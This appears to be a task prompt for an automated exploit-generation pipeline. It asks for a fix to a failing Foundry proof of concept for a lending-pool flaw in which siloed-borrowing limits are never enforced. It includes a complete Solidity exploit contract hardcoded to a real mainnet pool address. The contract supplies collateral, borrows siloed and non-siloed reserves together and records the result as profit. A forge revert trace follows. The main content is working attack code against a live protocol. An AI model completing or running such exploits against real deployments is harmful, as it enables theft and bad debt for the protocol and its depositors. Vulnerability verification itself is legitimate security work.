You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Siloed-borrowing risk controls are defined but never enforced on borrow
- claim: The protocol includes silo-borrowing state helpers (`getSiloedBorrowingState`, `getSiloedBorrowing`) and an explicit `SILOED_BORROWING_VIOLATION` error, but `BorrowLogic.executeBorrow()` delegates to `ValidationLogic.validateBorrow()` and that validation never checks either the requested reserve's silo flag or the user's existing siloed-borrowing state. As a result, borrowing a siloed reserve does not prevent additional borrows, and existing borrows do not prevent borrowing a siloed reserve.
- impact: If governance lists any reserve expecting isolated exposure, borrowers can still combine it with other debts. That defeats the intended risk model for siloed assets and can convert isolated risk into cross-reserve bad debt and insolvency during adverse price moves.
- exploit_paths: ["borrow() -> BorrowLogic.executeBorrow() -> ValidationLogic.validateBorrow()"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
}

interface IPriceOracleLike {
    function getAssetPrice(address asset) external view returns (uint256);
}

interface IPoolAddressesProviderLike {
    function getPriceOracle() external view returns (address);
    function getWETH() external view returns (address);
}

struct ReserveConfigurationMap {
    uint256 data;
}

interface IParaSpacePoolLike {
    function supply(
        address asset,
        uint256 amount,
        address onBehalfOf,
        uint16 referralCode
    ) external;

    function borrow(
        address asset,
        uint256 amount,
        uint16 referralCode,
        address onBehalfOf
    ) external;

    function repay(
        address asset,
        uint256 amount,
        address onBehalfOf
    ) external returns (uint256);

    function getReservesList() external view returns (address[] memory);
    function getConfiguration(address asset) external view returns (ReserveConfigurationMap memory);
    function ADDRESSES_PROVIDER() external view returns (IPoolAddressesProviderLike);

    function getUserAccountData(address user)
        external
        view
        returns (
            uint256 totalCollateralBase,
            uint256 totalDebtBase,
            uint256 availableBorrowsBase,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor,
            uint256 erc721HealthFactor
        );
}

contract FlawVerifier {
    address public constant TARGET = 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee;

    uint16 private constant REFERRAL_CODE = 0;
    uint256 private constant BASIS_POINTS = 10_000;
    uint256 private constant ACTIVE_SHIFT = 56;
    uint256 private constant FROZEN_SHIFT = 57;
    uint256 private constant BORROWING_SHIFT = 58;
    uint256 private constant PAUSED_SHIFT = 60;
    uint256 private constant SILO_SHIFT = 62;
    uint256 private constant ASSET_TYPE_SHIFT = 168;

    struct AssetView {
        address asset;
        uint256 price;
        uint256 unit;
        uint256 ltv;
        uint8 decimals;
        bool active;
        bool frozen;
        bool borrowingEnabled;
        bool paused;
        bool siloed;
        uint8 assetType;
    }

    struct BorrowSelection {
        AssetView asset;
        uint256 amount;
    }

    bool public attempted;
    bool public hypothesisValidated;
    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {}

    function executeOnOpportunity() external {
        require(!attempted, "already-attempted");
        attempted = true;

        IParaSpacePoolLike pool = IParaSpacePoolLike(TARGET);
        IPoolAddressesProviderLike provider = pool.ADDRESSES_PROVIDER();
        IPriceOracleLike oracle = IPriceOracleLike(provider.getPriceOracle());

        _wrapNativeToWeth(provider.getWETH());

        AssetView memory collateral = _findCollateral(pool, oracle);
        if (collateral.asset == address(0)) {
            // The bug only weakens borrow-side isolation checks. If the verifier starts with no
            // collateralizable on-chain balance, regular collateral/LTV checks still block any borrow.
            return;
        }

        uint256 collateralBalance = IERC20Like(collateral.asset).balanceOf(address(this));
        if (collateralBalance == 0) {
            return;
        }

        _forceApprove(collateral.asset, TARGET, collateralBalance);
        pool.supply(collateral.asset, collateralBalance, address(this), REFERRAL_CODE);

        BorrowSelection memory probeOther = _borrowFirstMatching(
            pool,
            oracle,
            collateral.asset,
            false,
            _availableBorrowsBase(pool) / 20
        );
        if (probeOther.amount == 0) {
            return;
        }

        BorrowSelection memory probeSilo = _borrowFirstMatching(
            pool,
            oracle,
            collateral.asset,
            true,
            _availableBorrowsBase(pool) / 20
        );
        if (probeSilo.amount == 0) {
            _repayAll(pool, probeOther.asset.asset);
            return;
        }

        // Exploit path, direction 1:
        // borrow() -> BorrowLogic.executeBorrow() -> ValidationLogic.validateBorrow()
        // Existing non-silo debt does not block borrowing a siloed reserve.
        _repayAll(pool, probeOther.asset.asset);
        _repayAll(pool, probeSilo.asset.asset);

        uint256 beforeSilo = IERC20Like(probeSilo.asset.asset).balanceOf(address(this));
        uint256 beforeOther = IERC20Like(probeOther.asset.asset).balanceOf(address(this));

        uint256 finalSiloAmount = _attemptBorrow(
            probeSilo.asset,
            (_availableBorrowsBase(pool) * 45) / 100
        );
        if (finalSiloAmount == 0) {
            return;
        }

        uint256 finalOtherAmount = _attemptBorrow(
            probeOther.asset,
            (_availableBorrowsBase(pool) * 90) / 100
        );
        if (finalOtherAmount == 0) {
            _repayAll(pool, probeSilo.asset.asset);
            return;
        }

        // Exploit path, direction 2:
        // borrow() -> BorrowLogic.executeBorrow() -> ValidationLogic.validateBorrow()
        // A siloed borrow does not block a later borrow of another reserve.
        hypothesisValidated = true;

        uint256 siloProfit = IERC20Like(probeSilo.asset.asset).balanceOf(address(this)) - beforeSilo;
        uint256 otherProfit = IERC20Like(probeOther.asset.asset).balanceOf(address(this)) - beforeOther;

        if (otherProfit >= siloProfit) {
            _profitToken = probeOther.asset.asset;
            _profitAmount = otherProfit;
        } else {
            _profitToken = probeSilo.asset.asset;
            _profitAmount = siloProfit;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _findCollateral(
        IParaSpacePoolLike pool,
        IPriceOracleLike oracle
    ) internal view returns (AssetView memory best) {
        address[] memory reserves = pool.getReservesList();
        uint256 bestValue;

        for (uint256 i = 0; i < reserves.length; i++) {
            AssetView memory candidate = _loadAssetView(pool, oracle, reserves[i]);
            if (!_canUseAsCollateral(candidate)) {
                continue;
            }

            uint256 balance = IERC20Like(candidate.asset).balanceOf(address(this));
            if (balance == 0) {
                continue;
            }

            uint256 valueBase = (balance * candidate.price) / candidate.unit;
            if (valueBase > bestValue) {
                bestValue = valueBase;
                best = candidate;
            }
        }
    }

    function _borrowFirstMatching(
        IParaSpacePoolLike pool,
        IPriceOracleLike oracle,
        address excludedAsset,
        bool wantSiloed,
        uint256 desiredBase
    ) internal returns (BorrowSelection memory chosen) {
        chosen = _borrowFirstMatchingInternal(pool, oracle, excludedAsset, wantSiloed, desiredBase);
        if (chosen.amount != 0) {
            return chosen;
        }

        return _borrowFirstMatchingInternal(pool, oracle, address(0), wantSiloed, desiredBase);
    }

    function _borrowFirstMatchingInternal(
        IParaSpacePoolLike pool,
        IPriceOracleLike oracle,
        address excludedAsset,
        bool wantSiloed,
        uint256 desiredBase
    ) internal returns (BorrowSelection memory chosen) {
        address[] memory reserves = pool.getReservesList();
        uint256 bestScore;

        for (uint256 i = 0; i < reserves.length; i++) {
            if (reserves[i] == excludedAsset) {
                continue;
            }

            AssetView memory candidate = _loadAssetView(pool, oracle, reserves[i]);
            if (!_canBorrow(candidate) || candidate.siloed != wantSiloed) {
                continue;
            }

            uint256 amount = _attemptBorrow(candidate, desiredBase);
            if (amount == 0) {
                continue;
            }

            uint256 score = _assetPriorityScore(candidate);
            if (score > bestScore) {
                if (chosen.amount != 0) {
                    _repayAll(pool, chosen.asset.asset);
                }
                bestScore = score;
                chosen = BorrowSelection({asset: candidate, amount: amount});
            } else {
                _repayAll(pool, candidate.asset);
            }
        }
    }

    function _assetPriorityScore(AssetView memory asset) internal pure returns (uint256) {
        // Favor standard ERC20 reserves with cheap denominations for probing. This replaces the
        // broken xToken-liquidity lookup with a heuristic, while the actual borrow call remains the
        // source of truth for whether a reserve is usable on this fork.
        uint256 score = BASIS_POINTS - asset.decimals;
        if (asset.price != 0) {
            score += (1e30 / asset.price);
        }
        if (asset.decimals <= 8) {
            score += BASIS_POINTS;
        }
        return score;
    }

    function _loadAssetView(
        IParaSpacePoolLike pool,
        IPriceOracleLike oracle,
        address asset
    ) internal view returns (AssetView memory info) {
        uint256 data = pool.getConfiguration(asset).data;
        uint8 decimals = uint8((data >> 48) & 0xff);
        uint256 unit = 10 ** decimals;

        info.asset = asset;
        info.price = oracle.getAssetPrice(asset);
        info.unit = unit;
        info.ltv = data & 0xffff;
        info.decimals = decimals;
        info.active = ((data >> ACTIVE_SHIFT) & 1) != 0;
        info.frozen = ((data >> FROZEN_SHIFT) & 1) != 0;
        info.borrowingEnabled = ((data >> BORROWING_SHIFT) & 1) != 0;
        info.paused = ((data >> PAUSED_SHIFT) & 1) != 0;
        info.siloed = ((data >> SILO_SHIFT) & 1) != 0;
        info.assetType = uint8((data >> ASSET_TYPE_SHIFT) & 0x0f);
    }

    function _availableBorrowsBase(IParaSpacePoolLike pool) internal view returns (uint256 availableBorrowsBase) {
        (, , availableBorrowsBase, , , , ) = pool.getUserAccountData(address(this));
    }

    function _attemptBorrow(
        AssetView memory asset,
        uint256 desiredBase
    ) internal returns (uint256) {
        if (desiredBase == 0 || !_canBorrow(asset)) {
            return 0;
        }

        uint256[] memory scales = new uint256[](7);
        scales[0] = BASIS_POINTS;
        scales[1] = 7_500;
        scales[2] = 5_000;
        scales[3] = 2_500;
        scales[4] = 1_000;
        scales[5] = 250;
        scales[6] = 100;

        for (uint256 i = 0; i < scales.length; i++) {
            uint256 scaledBase = (desiredBase * scales[i]) / BASIS_POINTS;
            uint256 amount = _quoteBorrowAmount(asset, scaledBase);
            if (amount == 0) {
                continue;
            }

            // This is the exact vulnerable path. The verifier intentionally proves success by
            // directly invoking the public borrow entrypoint rather than inferring state off-chain.
            (bool ok, ) = TARGET.call(
                abi.encodeWithSelector(
                    IParaSpacePoolLike.borrow.selector,
                    asset.asset,
                    amount,
                    REFERRAL_CODE,
                    address(this)
                )
            );
            if (ok) {
                return amount;
            }
        }

        return 0;
    }

    function _quoteBorrowAmount(
        AssetView memory asset,
        uint256 baseBudget
    ) internal pure returns (uint256) {
        if (asset.price == 0 || asset.unit == 0) {
            return 0;
        }

        uint256 amount = (baseBudget * asset.unit) / asset.price;
        if (amount == 0 && baseBudget != 0) {
            amount = 1;
        }

        return amount;
    }

    function _canUseAsCollateral(AssetView memory asset) internal pure returns (bool) {
        return
            asset.asset != address(0) &&
            asset.assetType == 0 &&
            asset.active &&
            !asset.frozen &&
            !asset.paused &&
            asset.ltv != 0 &&
            asset.price != 0 &&
            asset.unit != 0;
    }

    function _canBorrow(AssetView memory asset) internal pure returns (bool) {
        return
            asset.asset != address(0) &&
            asset.assetType == 0 &&
            asset.active &&
            !asset.frozen &&
            !asset.paused &&
            asset.borrowingEnabled &&
            asset.price != 0 &&
            asset.unit != 0;
    }

    function _wrapNativeToWeth(address weth) internal {
        if (weth == address(0) || address(this).balance == 0) {
            return;
        }

        IWETHLike(weth).deposit{value: address(this).balance}();
    }

    function _repayAll(IParaSpacePoolLike pool, address asset) internal {
        _forceApprove(asset, TARGET, type(uint256).max);
        pool.repay(asset, type(uint256).max, address(this));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool ok, bytes memory ret) = token.call(data);
        require(ok, "token-call-failed");
        if (ret.length != 0) {
            require(abi.decode(ret, (bool)), "token-call-false");
        }
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
ration(0x60E4d786628Fea6478F785A6d7e704777c86a7c6) [delegatecall]
    │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 374144419156877300559616431659481501017145427366792 [3.741e50] })
    │   │   └─ ← [Return] ReserveConfigurationMap({ data: 374144419156877300559616431659481501017145427366792 [3.741e50] })
    │   ├─ [20311] 0x6B58baa08a91f0F08900f43692a9796045454A17::getAssetPrice(0x60E4d786628Fea6478F785A6d7e704777c86a7c6) [staticcall]
    │   │   ├─ [14637] 0x1823C89715Fe3fB96A24d11c917aCA918894A090::50d25bcd() [staticcall]
    │   │   │   ├─ [7141] 0xb17Eac46CF1B9C5fe2F707c8A47AFc4d208b3E83::50d25bcd() [staticcall]
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000bab2996cebc27400
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000bab2996cebc27400
    │   │   └─ ← [Return] 13452983730000000000 [1.345e19]
    │   ├─ [3384] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getConfiguration(0xb7F7F6C52F2e2fdb1963Eab30438024864c313F6) [staticcall]
    │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0xb7F7F6C52F2e2fdb1963Eab30438024864c313F6) [delegatecall]
    │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 374144419156719454735116972899574173928737136449392 [3.741e50] })
    │   │   └─ ← [Return] ReserveConfigurationMap({ data: 374144419156719454735116972899574173928737136449392 [3.741e50] })
    │   ├─ [20311] 0x6B58baa08a91f0F08900f43692a9796045454A17::getAssetPrice(0xb7F7F6C52F2e2fdb1963Eab30438024864c313F6) [staticcall]
    │   │   ├─ [14637] 0x01B6710B01cF3dd8Ae64243097d91aFb03728Fdd::50d25bcd() [staticcall]
    │   │   │   ├─ [7141] 0xF0c85c0F7dC37e1605a0Db446a2A0e33Df7a3358::50d25bcd() [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000036ce7692d452c2800
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000036ce7692d452c2800
    │   │   └─ ← [Return] 63187588740000000000 [6.318e19]
    │   ├─ [3384] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getConfiguration(0xED5AF388653567Af2F388E6224dC7C4b3241C544) [staticcall]
    │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0xED5AF388653567Af2F388E6224dC7C4b3241C544) [delegatecall]
    │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 374144419156719454735116972899574173928737103680392 [3.741e50] })
    │   │   └─ ← [Return] ReserveConfigurationMap({ data: 374144419156719454735116972899574173928737103680392 [3.741e50] })
    │   ├─ [20311] 0x6B58baa08a91f0F08900f43692a9796045454A17::getAssetPrice(0xED5AF388653567Af2F388E6224dC7C4b3241C544) [staticcall]
    │   │   ├─ [14637] 0xA8B9A447C73191744D5B79BcE864F343455E1150::50d25bcd() [staticcall]
    │   │   │   ├─ [7141] 0xF0c3668756b9d9590B334768640FC5ACA02aE739::50d25bcd() [staticcall]
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000b469471f80140000
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000b469471f80140000
    │   │   └─ ← [Return] 13000000000000000000 [1.3e19]
    │   ├─ [3384] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getConfiguration(0x49cF6f5d44E70224e2E23fDcdd2C053F30aDA28B) [staticcall]
    │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0x49cF6f5d44E70224e2E23fDcdd2C053F30aDA28B) [delegatecall]
    │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 374144419156719454735116972899574173928737103678892 [3.741e50] })
    │   │   └─ ← [Return] ReserveConfigurationMap({ data: 374144419156719454735116972899574173928737103678892 [3.741e50] })
    │   ├─ [20311] 0x6B58baa08a91f0F08900f43692a9796045454A17::getAssetPrice(0x49cF6f5d44E70224e2E23fDcdd2C053F30aDA28B) [staticcall]
    │   │   ├─ [14637] 0x021264d59DAbD26E7506Ee7278407891Bb8CDCCc::50d25bcd() [staticcall]
    │   │   │   ├─ [7141] 0xB187B5A5A4B0A2Ae32FaEDf0FE4845203E0B7b11::50d25bcd() [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000002e34f35970939c00
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000002e34f35970939c00
    │   │   └─ ← [Return] 3329553590000000000 [3.329e18]
    │   ├─ [3384] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getConfiguration(ECRecover: [0x0000000000000000000000000000000000000001]) [staticcall]
    │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(ECRecover: [0x0000000000000000000000000000000000000001]) [delegatecall]
    │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 46116937353515113124744 [4.611e22] })
    │   │   └─ ← [Return] ReserveConfigurationMap({ data: 46116937353515113124744 [4.611e22] })
    │   ├─ [5311] 0x6B58baa08a91f0F08900f43692a9796045454A17::getAssetPrice(ECRecover: [0x0000000000000000000000000000000000000001]) [staticcall]
    │   │   ├─ [2137] 0xc7de7f4d4C9c991fF62a07D18b3E31e349833A18::50d25bcd() [staticcall]
    │   │   │   ├─ [1141] 0x72002129A3834d63C57d157DDF069deE37b08F24::50d25bcd() [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000008e223ad18a54a
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000008e223ad18a54a
    │   │   └─ ← [Return] 2500442669491530 [2.5e15]
    │   ├─ [3000] PRECOMPILES::ecrecover(0x70a082310000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f) [staticcall]
    │   │   └─ ← [Return] 0x
    │   └─ ← [Revert] EvmError: Revert
    └─ ← [Revert] exploit call reverted

Backtrace:
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 35.70s (35.66s CPU time)

Ran 1 test suite in 35.71s (35.70s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 453136)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
